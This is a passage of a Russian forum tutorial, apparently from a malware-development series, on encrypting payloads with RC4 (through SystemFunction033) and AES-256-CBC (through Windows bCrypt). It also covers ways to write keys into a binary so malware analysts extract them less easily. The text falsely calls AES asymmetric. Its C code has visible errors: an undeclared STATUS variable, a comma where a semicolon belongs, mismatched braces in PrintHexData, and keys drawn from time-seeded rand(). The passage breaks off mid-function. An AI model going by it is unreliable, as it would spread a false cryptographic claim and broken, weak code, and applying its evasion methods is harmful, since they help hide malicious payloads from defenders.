+<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
+	<div class="bbCodeBlock-title">
+		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
+	</div>
+	<div class="bbCodeBlock-content" dir="ltr">
+		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef struct
+{
+    DWORD    Length;
+    DWORD    MaximumLength;
+    PVOID    Buffer;
+
+} USTRING;
+
+
+typedef NTSTATUS(NTAPI* fnSystemFunction033)(
+    struct USTRING* Data,
+    struct USTRING* Key
+    );
+
+
+/*
+Helper function that calls SystemFunction033
+* pRc4Key - The RC4 key use to encrypt/decrypt
+* pPayloadData - The base address of the buffer to encrypt/decrypt
+* dwRc4KeySize - Size of pRc4key (Param 1)
+* sPayloadSize - Size of pPayloadData (Param 2)
+*/
+BOOL Rc4EncryptionViSystemFunc033(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {
+
+    NTSTATUS    STATUS = NULL;
+
+    USTRING        Key = {
+            .Buffer        = pRc4Key,
+            .Length        = dwRc4KeySize,
+            .MaximumLength = dwRc4KeySize
+    };
+
+    USTRING     Data = {
+            .Buffer         = pPayloadData,
+            .Length         = sPayloadSize,
+            .MaximumLength  = sPayloadSize
+    };
+
+    fnSystemFunction033 SystemFunction033 = (fnSystemFunction033)GetProcAddress(LoadLibraryA(&quot;Advapi32&quot;), &quot;SystemFunction033&quot;);
+
+    if ((STATUS = SystemFunction033(&amp;Data, &amp;Key)) != 0x0) {
+        printf(&quot;[!] SystemFunction033 FAILED With Error: 0x%0.8X \n&quot;, STATUS);
+        return FALSE;
+    }
+
+    return TRUE;
+}</code></pre>
+	</div>
+</div><br />
+<b>Формат ключа шифрования/дешифрования</b><br />
+<br />
+Имейте в виду, что внедрение открытого текстового ключа в бинарный файл считается плохой практикой и может быть легко извлечено при анализе вредоносного ПО. В будущих статьях будут представлены решения, обеспечивающие невозможность легкого извлечения ключа.<br />
+<br />
+<b>Различные методы представления ключа</b><br />
+<br />
+При реализации процесса шифрования важно правильно представить ключ шифрования. Ключ может быть представлен разными способами в зависимости от конкретных требований к безопасности, удобства и других аспектов.<br />
+<br />
+<ol>
+<li data-xf-list-type="ol"><b>Прямое представление ключа в виде строки:</b> Простейший и наиболее понятный способ. Однако, такое представление может быть легко обнаружено и извлечено из исполняемого файла при анализе.<br />
+unsigned char* key = &quot;ru-sfera.pw&quot;;</li>
+<li data-xf-list-type="ol"><b>Представление ключа в виде массива шестнадцатеричных байтов:</b> Это немного менее очевидно для человеческого глаза при просмотре исходного кода, но остается простым для анализа.<br />
+unsigned char key[] = {<br />
+0x6D, 0x61, 0x6C, 0x64, 0x65, 0x76, 0x31, 0x32, 0x33<br />
+};</li>
+<li data-xf-list-type="ol"><b>Представление ключа в виде шестнадцатеричной строки (экранированной последовательностью):</b> Похоже на предыдущий метод, но представляет собой строку.<br />
+unsigned char* key = &quot;\x6D\x61\x64\x65\x76\x31\x32\x33&quot;;</li>
+<li data-xf-list-type="ol"><b>Представление ключа через стек строк:</b> Этот метод маскирует ключ, представляя его в виде массива символов. Это может создать дополнительный уровень сложности для автоматических инструментов анализа.<br />
+unsigned char key[] = {<br />
+&#039;r&#039;, &#039;u&#039;, &#039;-&#039;, &#039;s&#039;, &#039;f&#039;, &#039;e&#039;,&#039;r&#039;, &#039;a&#039;, &#039;.&#039;, &#039;p&#039;,&#039;w&#039;<br />
+};</li>
+</ol>Важно помнить, что независимо от выбранного метода представления ключа, ключи, зашитые прямо в бинарные файлы, представляют угрозу безопасности. Если злоумышленник получит доступ к исполняемому файлу, он может попытаться извлечь этот ключ. Существуют различные методы обфускации и скрытия ключей, которые могут быть применены для повышения безопасности.<br />
+<br />
+<br />
+<b> Шифрование AES (Стандарт Современного Шифрования)</b><br />
+<br />
+Теперь давайте рассмотрим более безопасный алгоритм шифрования, известный как AES (Advanced Encryption Standard). Это ассимитричный алгоритм шифрования, что означает использование нескольких ключей для шифрования/расшифрования.<br />
+<br />
+Существует несколько видов шифрования AES, таких как AES128, AES192 и AES256, которые отличаются размером ключа. Например, AES128 использует 128-битный ключ, в то время как AES256 использует 256-битный ключ.<br />
+<br />
+К тому же, AES может использовать различные режимы работы блочных шифров, такие как CBC и GCM. В зависимости от режима работы AES требуется дополнительный компонент вместе с ключом шифрования, называемый вектором инициализации или IV. Использование IV добавляет дополнительный уровень безопасности к процессу шифрования.<br />
+<br />
+Независимо от выбранного типа AES, AES всегда требует ввод в 128 бит и выводит блоки в 128 бит. Важно помнить, что входные данные должны быть кратны 16 байтам (128 бит). Если шифруемая полезная нагрузка не кратна 16 байтам, то требуется увеличение размера полезной нагрузки и приведения ее к кратности 16 байтам.<br />
+<br />
+В статье предоставлены пример кода, который использует AES256-CBC. Пример использует WinAPI. Стоит отметить, что, поскольку используется AES256-CBC, код использует 32-байтный ключ и 16-байтный IV. Это может измениться, если в коде используется другой тип или режим AES.<br />
+<br />
+<b>Шифрование с использованием WinAPI (библиотека bCrypt)</b><br />
+<br />
+Существует несколько способов реализации алгоритма шифрования AES. В этом разделе используется библиотека bCrypt (bcrypt.h) для выполнения шифрования AES.<br />
+<br />
+<b>Структура AES</b><br />
+<br />
+Для начала создается структура AES, которая содержит необходимые данные для выполнения шифрования и дешифрования.<br />
+<br />
+
+	
+	
+
+
+
+<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
+	<div class="bbCodeBlock-title">
+		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
+	</div>
+	<div class="bbCodeBlock-content" dir="ltr">
+		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef struct _AES {
+    PBYTE    pPlainText;         // базовый адрес исходного текста
+    DWORD    dwPlainSize;        // размер исходного текста
+
+    PBYTE    pCipherText;        // базовый адрес зашифрованных данных
+    DWORD    dwCipherSize;       // его размер (может измениться относительно dwPlainSize, если было дополнение)
+
+    PBYTE    pKey;               // 32-байтный ключ
+    PBYTE    pIv;                // 16-байтный IV
+} AES, *PAES;</code></pre>
+	</div>
+</div><br />
+<b>Обертка для упрощения использования алгоритма (Функция шифрования)</b><br />
+<br />
+Функция SimpleEncryption имеет шесть параметров, используемых для инициализации структуры AES. После инициализации структуры функция вызывает InstallAesEncryption для выполнения процесса шифрования AES. Отметим, что два из ее параметров являются исходящими параметрами, поэтому функция возвращает следующее:<br />
+<br />
+pCipherTextData - указатель на вновь выделенный буфер кучи, содержащий данные шифротекста.<br />
+<br />
+sCipherTextSize - размер буфера шифротекста.<br />
+<br />
+Функция возвращает TRUE, если InstallAesEncryption завершается успешно, иначе FALSE.<br />
+<br />
+
+	
+	
+
+
+
+<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
+	<div class="bbCodeBlock-title">
+		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
+	</div>
+	<div class="bbCodeBlock-content" dir="ltr">
+		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// Функция-обертка для InstallAesEncryption, упрощающая процесс
+BOOL SimpleEncryption(IN PVOID pPlainTextData, IN DWORD sPlainTextSize, IN PBYTE pKey, IN PBYTE pIv, OUT PVOID* pCipherTextData, OUT DWORD* sCipherTextSize) {
+    if (pPlainTextData == NULL || sPlainTextSize == NULL || pKey == NULL || pIv == NULL)
+        return FALSE;
+
+    // Инициализация структуры
+    AES Aes = {
+        .pKey        = pKey,
+        .pIv         = pIv,
+        .pPlainText  = pPlainTextData,
+        .dwPlainSize = sPlainTextSize
+    };
+
+    if (!InstallAesEncryption(&amp;Aes)) {
+        return FALSE;
+    }
+
+    // Сохранение вывода
+    *pCipherTextData = Aes.pCipherText;
+    *sCipherTextSize = Aes.dwCipherSize;
+
+    return TRUE;
+}</code></pre>
+	</div>
+</div><br />
+<b>Обертка для упрощения использования алгоритма (Функция расшифровки)</b><br />
+<br />
+Функция SimpleDecryption также имеет шесть параметров и работает аналогично SimpleEncryption, но с отличием в том, что она вызывает функцию InstallAesDecryption и возвращает два других значения.<br />
+<br />
+pPlainTextData - указатель на вновь выделенный буфер кучи, содержащий данные исходного текста.<br />
+<br />
+sPlainTextSize - размер буфера исходного текста.<br />
+<br />
+Функция возвращает TRUE, если InstallAesDecryption завершается успешно, иначе FALSE.<br />
+<br />
+
+	
+	
+
+
+
+<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
+	<div class="bbCodeBlock-title">
+		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
+	</div>
+	<div class="bbCodeBlock-content" dir="ltr">
+		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>// Функция-обертка для InstallAesDecryption, упрощающая процесс
+BOOL SimpleDecryption(IN PVOID pCipherTextData, IN DWORD sCipherTextSize, IN PBYTE pKey, IN PBYTE pIv, OUT PVOID* pPlainTextData, OUT DWORD* sPlainTextSize) {
+    if (pCipherTextData == NULL || sCipherTextSize == NULL || pKey == NULL || pIv == NULL)
+        return FALSE;
+
+    // Инициализация структуры
+    AES Aes = {
+        .pKey          = pKey,
+        .pIv           = pIv,
+        .pCipherText   = pCipherTextData,
+        .dwCipherSize  = sCipherTextSize
+    };
+
+    if (!InstallAesDecryption(&amp;Aes)) {
+        return FALSE;
+    }
+
+    // Сохранение вывода
+    *pPlainTextData = Aes.pPlainText;
+    *sPlainTextSize = Aes.dwPlainSize;
+
+    return TRUE;
+}</code></pre>
+	</div>
+</div><br />
+<b>Функция InstallAesEncryption</b><br />
+<br />
+Функция InstallAesEncryption выполняет шифрование по методу AES.<br />
+Функция имеет один параметр, PAES, который является указателем на заполненную структуру AES. Функции библиотеки bCrypt, используемые в этой функции, показаны ниже.<br />
+<br />
+BCryptOpenAlgorithmProvider - Используется для загрузки поставщика BCRYPT_AES_ALGORITHM Cryptographic Next Generation (CNG), чтобы обеспечить использование криптографических функций.<br />
+<br />
+BCryptGetProperty - Эта функция вызывается дважды: в первый раз для получения значения BCRYPT_OBJECT_LENGTH и во второй раз для извлечения значения идентификатора свойства BCRYPT_BLOCK_LENGTH.<br />
+<br />
+BCryptSetProperty - Используется для инициализации идентификатора свойства BCRYPT_OBJECT_LENGTH.<br />
+<br />
+BCryptGenerateSymmetricKey - Используется для создания объекта ключа из входного ключа AES.<br />
+<br />
+BCryptEncrypt - Используется для шифрования указанного блока данных. Эта функция вызывается дважды: первый вызов получает размер зашифрованных данных, чтобы выделить буфер кучи этого размера. Второй вызов шифрует данные и сохраняет шифртекст в выделенной куче.<br />
+<br />
+BCryptDestroyKey - Используется для очистки путем уничтожения объекта ключа, созданного с использованием BCryptGenerateSymmetricKey.<br />
+<br />
+BCryptCloseAlgorithmProvider - Используется для очистки путем закрытия дескриптора объекта алгоритма, созданного ранее с использованием BCryptOpenAlgorithmProvider.<br />
+<br />
+Функция возвращает TRUE, если успешно шифрует полезную нагрузку, в противном случае - FALSE.<br />
+<br />
+
+	
+	
+
+
+
+<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
+	<div class="bbCodeBlock-title">
+		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
+	</div>
+	<div class="bbCodeBlock-content" dir="ltr">
+		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// The encryption implementation
+BOOL InstallAesEncryption(PAES pAes) {
+
+  BOOL                  bSTATE           = TRUE;
+  BCRYPT_ALG_HANDLE     hAlgorithm       = NULL;
+  BCRYPT_KEY_HANDLE     hKeyHandle       = NULL;
+
+  ULONG               cbResult         = NULL;
+  DWORD               dwBlockSize      = NULL;
+
+  DWORD               cbKeyObject      = NULL;
+  PBYTE               pbKeyObject      = NULL;
+
+  PBYTE              pbCipherText     = NULL;
+  DWORD               cbCipherText     = NULL,
+
+
+  // Intializing &quot;hAlgorithm&quot; as AES algorithm Handle
+  STATUS = BCryptOpenAlgorithmProvider(&amp;hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0);
+  if (!NT_SUCCESS(STATUS)) {
+        printf(&quot;[!] BCryptOpenAlgorithmProvider Failed With Error: 0x%0.8X \n&quot;, STATUS);
+        bSTATE = FALSE; goto _EndOfFunc;
+  }
+
+  // Getting the size of the key object variable pbKeyObject. This is used by the BCryptGenerateSymmetricKey function later
+  STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_OBJECT_LENGTH, (PBYTE)&amp;cbKeyObject, sizeof(DWORD), &amp;cbResult, 0);
+  if (!NT_SUCCESS(STATUS)) {
+        printf(&quot;[!] BCryptGetProperty[1] Failed With Error: 0x%0.8X \n&quot;, STATUS);
+        bSTATE = FALSE; goto _EndOfFunc;
+  }
+
+  // Getting the size of the block used in the encryption. Since this is AES it must be 16 bytes.
+  STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_BLOCK_LENGTH, (PBYTE)&amp;dwBlockSize, sizeof(DWORD), &amp;cbResult, 0);
+  if (!NT_SUCCESS(STATUS)) {
+       printf(&quot;[!] BCryptGetProperty[2] Failed With Error: 0x%0.8X \n&quot;, STATUS);
+        bSTATE = FALSE; goto _EndOfFunc;
+  }
+
+  // Checking if block size is 16 bytes
+  if (dwBlockSize != 16) {
+        bSTATE = FALSE; goto _EndOfFunc;
+  }
+
+  // Allocating memory for the key object
+  pbKeyObject = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbKeyObject);
+  if (pbKeyObject == NULL) {
+        bSTATE = FALSE; goto _EndOfFunc;
+  }
+
+  // Setting Block Cipher Mode to CBC. This uses a 32 byte key and a 16 byte IV.
+  STATUS = BCryptSetProperty(hAlgorithm, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
+  if (!NT_SUCCESS(STATUS)) {
+        printf(&quot;[!] BCryptSetProperty Failed With Error: 0x%0.8X \n&quot;, STATUS);
+        bSTATE = FALSE; goto _EndOfFunc;
+  }
+
+  // Generating the key object from the AES key &quot;pAes-&gt;pKey&quot;. The output will be saved in pbKeyObject and will be of size cbKeyObject
+  STATUS = BCryptGenerateSymmetricKey(hAlgorithm, &amp;hKeyHandle, pbKeyObject, cbKeyObject, (PBYTE)pAes-&gt;pKey, KEYSIZE, 0);
+  if (!NT_SUCCESS(STATUS)) {
+        printf(&quot;[!] BCryptGenerateSymmetricKey Failed With Error: 0x%0.8X \n&quot;, STATUS);
+        bSTATE = FALSE; goto _EndOfFunc;
+  }
+
+  // Running BCryptEncrypt first time with NULL output parameters to retrieve the size of the output buffer which is saved in cbCipherText
+  STATUS = BCryptEncrypt(hKeyHandle, (PUCHAR)pAes-&gt;pPlainText, (ULONG)pAes-&gt;dwPlainSize, NULL, pAes-&gt;pIv, IVSIZE, NULL, 0, &amp;cbCipherText, BCRYPT_BLOCK_PADDING);
+  if (!NT_SUCCESS(STATUS)) {
+        printf(&quot;[!] BCryptEncrypt[1] Failed With Error: 0x%0.8X \n&quot;, STATUS);
+        bSTATE = FALSE; goto _EndOfFunc;
+  }
+
+  // Allocating enough memory for the output buffer, cbCipherText
+  pbCipherText = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbCipherText);
+  if (pbCipherText == NULL) {
+        bSTATE = FALSE; goto _EndOfFunc;
+  }
+
+  // Running BCryptEncrypt again with pbCipherText as the output buffer
+  STATUS = BCryptEncrypt(hKeyHandle, (PUCHAR)pAes-&gt;pPlainText, (ULONG)pAes-&gt;dwPlainSize, NULL, pAes-&gt;pIv, IVSIZE, pbCipherText, cbCipherText, &amp;cbResult, BCRYPT_BLOCK_PADDING);
+  if (!NT_SUCCESS(STATUS)) {
+        printf(&quot;[!] BCryptEncrypt[2] Failed With Error: 0x%0.8X \n&quot;, STATUS);
+        bSTATE = FALSE; goto _EndOfFunc;
+  }
+
+
+  // Clean up
+_EndOfFunc:
+  if (hKeyHandle)
+        BCryptDestroyKey(hKeyHandle);
+  if (hAlgorithm)
+        BCryptCloseAlgorithmProvider(hAlgorithm, 0);
+  if (pbKeyObject)
+        HeapFree(GetProcessHeap(), 0, pbKeyObject);
+  if (pbCipherText != NULL &amp;&amp; bSTATE) {
+        // If everything worked, save pbCipherText and cbCipherText
+        pAes-&gt;pCipherText     = pbCipherText;
+        pAes-&gt;dwCipherSize     = cbCipherText;
+  }
+  return bSTATE;
+}</code></pre>
+	</div>
+</div><br />
+<b>Функция InstallAesDecryption</b><br />
+<br />
+Функция InstallAesDecryption выполняет расшифровку по методу AES.<br />
+Функция имеет один параметр, PAES, который является указателем на заполненную структуру AES.<br />
+<br />
+Функции библиотеки bCrypt, используемые в этой функции, такие же, как и в функции InstallAesEncryption выше, единственное различие заключается в том, что используется BCryptDecrypt вместо BCryptEncrypt.<br />
+<br />
+BCryptDecrypt - Используется для расшифровки указанного блока данных.<br />
+Эта функция вызывается дважды: в первый раз для получения размера расшифрованных данных, чтобы выделить буфер кучи этого размера. Второй вызов расшифровывает данные и сохраняет текстовые данные в выделенной куче.<br />
+<br />
+Функция возвращает TRUE, если успешно расшифровывает полезную нагрузку, в противном случае - FALSE.<br />
+<br />
+
+	
+	
+
+
+
+<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
+	<div class="bbCodeBlock-title">
+		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
+	</div>
+	<div class="bbCodeBlock-content" dir="ltr">
+		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// The decryption implementation
+BOOL InstallAesDecryption(PAES pAes) {
+
+  BOOL                  bSTATE          = TRUE;
+  BCRYPT_ALG_HANDLE     hAlgorithm      = NULL;
+  BCRYPT_KEY_HANDLE     hKeyHandle      = NULL;
+
+  ULONG                 cbResult        = NULL;
+  DWORD                 dwBlockSize     = NULL;
+
+  DWORD                 cbKeyObject     = NULL;
+  PBYTE                 pbKeyObject     = NULL;
+
+  PBYTE                 pbPlainText     = NULL;
+  DWORD                 cbPlainText     = NULL,
+
+  // Intializing &quot;hAlgorithm&quot; as AES algorithm Handle
+  STATUS = BCryptOpenAlgorithmProvider(&amp;hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0);
+  if (!NT_SUCCESS(STATUS)) {
+        printf(&quot;[!] BCryptOpenAlgorithmProvider Failed With Error: 0x%0.8X \n&quot;, STATUS);
+        bSTATE = FALSE; goto _EndOfFunc;
+  }
+
+  // Getting the size of the key object variable pbKeyObject. This is used by the BCryptGenerateSymmetricKey function later
+  STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_OBJECT_LENGTH, (PBYTE)&amp;cbKeyObject, sizeof(DWORD), &amp;cbResult, 0);
+  if (!NT_SUCCESS(STATUS)) {
+        printf(&quot;[!] BCryptGetProperty[1] Failed With Error: 0x%0.8X \n&quot;, STATUS);
+        bSTATE = FALSE; goto _EndOfFunc;
+  }
+
+  // Getting the size of the block used in the encryption. Since this is AES it should be 16 bytes.
+  STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_BLOCK_LENGTH, (PBYTE)&amp;dwBlockSize, sizeof(DWORD), &amp;cbResult, 0);
+  if (!NT_SUCCESS(STATUS)) {
+        printf(&quot;[!] BCryptGetProperty[2] Failed With Error: 0x%0.8X \n&quot;, STATUS);
+        bSTATE = FALSE; goto _EndOfFunc;
+  }
+
+  // Checking if block size is 16 bytes
+  if (dwBlockSize != 16) {
+        bSTATE = FALSE; goto _EndOfFunc;
+  }
+
+  // Allocating memory for the key object
+  pbKeyObject = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbKeyObject);
+  if (pbKeyObject == NULL) {
+        bSTATE = FALSE; goto _EndOfFunc;
+  }
+
+  // Setting Block Cipher Mode to CBC. This uses a 32 byte key and a 16 byte IV.
+  STATUS = BCryptSetProperty(hAlgorithm, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
+  if (!NT_SUCCESS(STATUS)) {
+        printf(&quot;[!] BCryptSetProperty Failed With Error: 0x%0.8X \n&quot;, STATUS);
+        bSTATE = FALSE; goto _EndOfFunc;
+  }
+
+  // Generating the key object from the AES key &quot;pAes-&gt;pKey&quot;. The output will be saved in pbKeyObject of size cbKeyObject
+  STATUS = BCryptGenerateSymmetricKey(hAlgorithm, &amp;hKeyHandle, pbKeyObject, cbKeyObject, (PBYTE)pAes-&gt;pKey, KEYSIZE, 0);
+  if (!NT_SUCCESS(STATUS)) {
+        printf(&quot;[!] BCryptGenerateSymmetricKey Failed With Error: 0x%0.8X \n&quot;, STATUS);
+        bSTATE = FALSE; goto _EndOfFunc;
+  }
+
+  // Running BCryptDecrypt first time with NULL output parameters to retrieve the size of the output buffer which is saved in cbPlainText
+  STATUS = BCryptDecrypt(hKeyHandle, (PUCHAR)pAes-&gt;pCipherText, (ULONG)pAes-&gt;dwCipherSize, NULL, pAes-&gt;pIv, IVSIZE, NULL, 0, &amp;cbPlainText, BCRYPT_BLOCK_PADDING);
+  if (!NT_SUCCESS(STATUS)) {
+        printf(&quot;[!] BCryptDecrypt[1] Failed With Error: 0x%0.8X \n&quot;, STATUS);
+        bSTATE = FALSE; goto _EndOfFunc;
+  }
+
+  // Allocating enough memory for the output buffer, cbPlainText
+  pbPlainText = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbPlainText);
+  if (pbPlainText == NULL) {
+        bSTATE = FALSE; goto _EndOfFunc;
+  }
+
+  // Running BCryptDecrypt again with pbPlainText as the output buffer
+  STATUS = BCryptDecrypt(hKeyHandle, (PUCHAR)pAes-&gt;pCipherText, (ULONG)pAes-&gt;dwCipherSize, NULL, pAes-&gt;pIv, IVSIZE, pbPlainText, cbPlainText, &amp;cbResult, BCRYPT_BLOCK_PADDING);
+  if (!NT_SUCCESS(STATUS)) {
+        printf(&quot;[!] BCryptDecrypt[2] Failed With Error: 0x%0.8X \n&quot;, STATUS);
+        bSTATE = FALSE; goto _EndOfFunc;
+  }
+
+  // Clean up
+_EndOfFunc:
+  if (hKeyHandle)
+        BCryptDestroyKey(hKeyHandle);
+  if (hAlgorithm)
+        BCryptCloseAlgorithmProvider(hAlgorithm, 0);
+  if (pbKeyObject)
+        HeapFree(GetProcessHeap(), 0, pbKeyObject);
+  if (pbPlainText != NULL &amp;&amp; bSTATE) {
+        // if everything went well, we save pbPlainText and cbPlainText
+        pAes-&gt;pPlainText   = pbPlainText;
+        pAes-&gt;dwPlainSize  = cbPlainText;
+  }
+  return bSTATE;
+
+}</code></pre>
+	</div>
+</div><br />
+<b>Дополнительные вспомогательные функции</b><br />
+<br />
+Код также включает в себя две небольшие вспомогательные функции: PrintHexData и GenerateRandomBytes.<br />
+<br />
+Первая функция, PrintHexData, выводит входной буфер в виде массива символов в синтаксисе C на консоль.<br />
+<br />
+
+	
+	
+
+
+
+<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
+	<div class="bbCodeBlock-title">
+		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
+	</div>
+	<div class="bbCodeBlock-content" dir="ltr">
+		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// Вывод входного буфера в виде шестнадцатеричного массива символов
+VOID PrintHexData(LPCSTR Name, PBYTE Data, SIZE_T Size) {
+
+  printf(&quot;unsigned char %s[] = {&quot;, Name);
+
+  for (int i = 0; i &lt; Size; i++) {
+        if (i % 16 == 0)
+              printf(&quot;\n\t&quot;);
+
+        if (i &lt; Size - 1) {
+            printf(&quot;0x%0.2X, &quot;, Data[i]);
+        else
+              printf(&quot;0x%0.2X &quot;, Data[i]);
+  }
+
+  printf(&quot;};\n\n\n&quot;);
+
+}</code></pre>
+	</div>
+</div><br />
+Другая функция, GenerateRandomBytes, заполняет входной буфер случайными байтами, которые в этом контексте используются для генерации случайного ключа и инициализирующего вектора (IV).<br />
+<br />
+
+	
+	
+
+
+
+<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
+	<div class="bbCodeBlock-title">
+		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
+	</div>
+	<div class="bbCodeBlock-content" dir="ltr">
+		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// Генерация случайных байт заданного размера
+VOID GenerateRandomBytes(PBYTE pByte, SIZE_T sSize) {
+
+  for (int i = 0; i &lt; sSize; i++) {
+        pByte[i] = (BYTE)rand() % 0xFF;
+  }
+
+}</code></pre>
+	</div>
+</div><br />
+<b>Пример использования:</b><br />
+<br />
+Ниже представлена основная функция, которая используется для выполнения процедуры шифрования массива открытого текста.<br />
+<br />
+
+	
+	
+
+
+
+<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
+	<div class="bbCodeBlock-title">
+		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
+	</div>
+	<div class="bbCodeBlock-content" dir="ltr">
+		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// The plaintext, in hex format, that will be encrypted
+// this is the following string in hex &quot;This is a plain text string, we&#039;ll try to encrypt/decrypt !&quot;
+unsigned char Data[] = {
+    0x54, 0x68, 0x69, 0x73, 0x20, 0x69, 0x73, 0x20, 0x61, 0x20, 0x70, 0x6C,
+    0x61, 0x69, 0x6E, 0x20, 0x74, 0x65, 0x78, 0x74, 0x20, 0x73, 0x74, 0x72,
+    0x69, 0x6E, 0x67, 0x2C, 0x20, 0x77, 0x65, 0x27, 0x6C, 0x6C, 0x20, 0x74,
+    0x72, 0x79, 0x20, 0x74, 0x6F, 0x20, 0x65, 0x6E, 0x63, 0x72, 0x79, 0x70,
+    0x74, 0x2F, 0x64, 0x65, 0x63, 0x72, 0x79, 0x70, 0x74, 0x20, 0x21
+};
+
+int main() {
+
+    BYTE pKey [KEYSIZE];                    // KEYSIZE is 32 bytes
+    BYTE pIv [IVSIZE];                      // IVSIZE is 16 bytes
+
+    srand(time(NULL));                      // The seed to generate the key. This is used to further randomize the key.
+    GenerateRandomBytes(pKey, KEYSIZE);     // Generating a key with the helper function
+
+    srand(time(NULL) ^ pKey[0]);            // The seed to generate the IV. Use the first byte of the key to add more randomness.
+    GenerateRandomBytes(pIv, IVSIZE);       // Generating the IV with the helper function
+
+    // Printing both key and IV onto the console
+    PrintHexData(&quot;pKey&quot;, pKey, KEYSIZE);
+    PrintHexData(&quot;pIv&quot;, pIv, IVSIZE);
+
+    // Defining two variables the output buffer and its respective size which will be used in SimpleEncryption
+    PVOID pCipherText = NULL;
+    DWORD dwCipherSize = NULL;
+
+    // Encrypting
+    if (!SimpleEncryption(Data, sizeof(Data), pKey, pIv, &amp;pCipherText, &amp;dwCipherSize)) {
+        return -1;
+    }
+
+    // Print the encrypted buffer as a hex array
+    PrintHexData(&quot;CipherText&quot;, pCipherText, dwCipherSize);
+
+    // Clean up
+    HeapFree(GetProcessHeap(), 0, pCipherText);
+    system(&quot;PAUSE&quot;);
+    return 0;
+}</code></pre>
+	</div>
+</div><br />
+Этот код демонстрирует, как можно реализовать шифрование данных с использованием AES.<br />
+<br />
+<div class="bbImageWrapper  js-lbImage" title="1746773739714.png"
+		data-src="https://osint42.org/attachments/1746773739714-png.79/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
+		<img src="../../../../attachments/1746773739714-png.79/index.html"
+			data-url=""
+			class="bbImage"
+			data-zoom-target="1"
+			style=""
+			alt="1746773739714.png"
+			title="1746773739714.png"
+			width="1588" height="831" loading="lazy" />
+	</div><br />
+<br />
+<b>Пример расшифровки данных</b><br />
+<br />
+Ниже представлена основная функция, которая используется для выполнения процедуры дешифрования.<br />
+<br />
+Для процедуры дешифрования требуются ключ дешифрования, инициализирующий вектор (IV) и шифртекст.<br />
+<br />
+
+	
+	
+
+
+
+<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
+	<div class="bbCodeBlock-title">
+		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
+	</div>
+	<div class="bbCodeBlock-content" dir="ltr">
+		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// the key printed to the screen
+unsigned char pKey[] = {
+        0x3E, 0x31, 0xF4, 0x00, 0x50, 0xB6, 0x6E, 0xB8, 0xF6, 0x98, 0x95, 0x27, 0x43, 0x27, 0xC0, 0x55,
+        0xEB, 0xDB, 0xE1, 0x7F, 0x05, 0xFE, 0x65, 0x6D, 0x0F, 0xA6, 0x5B, 0x00, 0x33, 0xE6, 0xD9, 0x0B };
+
+// the iv printed to the screen
+unsigned char pIv[] = {
+        0xB4, 0xC8, 0x1D, 0x1D, 0x14, 0x7C, 0xCB, 0xFA, 0x07, 0x42, 0xD9, 0xED, 0x1A, 0x86, 0xD9, 0xCD };
+
+
+// the encrypted buffer printed to the screen, which is:
+unsigned char CipherText[] = {
+        0x97, 0xFC, 0x24, 0xFE, 0x97, 0x64, 0xDF, 0x61, 0x81, 0xD8, 0xC1, 0x9E, 0x23, 0x30, 0x79, 0xA1,
+        0xD3, 0x97, 0x5B, 0xAE, 0x29, 0x7F, 0x70, 0xB9, 0xC1, 0xEC, 0x5A, 0x09, 0xE3, 0xA4, 0x44, 0x67,
+        0xD6, 0x12, 0xFC, 0xB5, 0x86, 0x64, 0x0F, 0xE5, 0x74, 0xF9, 0x49, 0xB3, 0x0B, 0xCA, 0x0C, 0x04,
+        0x17, 0xDB, 0xEF, 0xB2, 0x74, 0xC2, 0x17, 0xF6, 0x34, 0x60, 0x33, 0xBA, 0x86, 0x84, 0x85, 0x5E };
+
+int main() {
+
+    // Defining two variables the output buffer and its respective size which will be used in SimpleDecryption
+    PVOID    pPlaintext  = NULL;
